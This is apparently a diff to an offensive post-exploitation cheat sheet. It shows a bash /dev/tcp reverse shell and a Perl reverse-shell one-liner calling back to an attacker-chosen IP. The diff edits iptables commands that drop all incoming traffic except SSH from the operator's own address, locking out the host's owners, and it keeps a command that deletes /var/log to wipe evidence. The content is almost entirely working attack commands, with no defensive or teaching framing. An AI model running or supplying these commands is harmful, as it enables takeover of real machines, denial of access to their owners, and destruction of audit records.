@@ -29,18 +29,15 @@ bash -i >& /dev/tcp/yourip/portofchoice 0>&1
  
 perl -e 'use Socket;$i="yourip";$p=portofchoice;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  
-# Installs iptables, ignore if you already have it.
+# Installs iptables and configures it to only allow connections from your IP on port 22,
+# if you already have iptables installed remove the first command, edit the IP in the IP table command to your own 
+# and edit the port to the ssh port.
  
-apt-get install iptables
+su -l -c "apt-get install iptables && iptables -A INPUT -p tcp -s 127.0.0.1 --d-port 22 -j ACCEPT"
  
 # The below line will DROP all incoming connections.
  
-iptables -P INPUT DROP
- 
-# Allows specific IPs to specific ports for example port 22 for IP 127.0.0.1, replace with the new SSH port you will use.
- 
-iptables -A INPUT -p tcp -s 127.0.0.1 --d-port 22 -j ACCEPT
- 
+su -l -c "iptables -P INPUT DROP"
  
 su -l -c "rm -rf /var/log && rm -rf /var/logs"
  
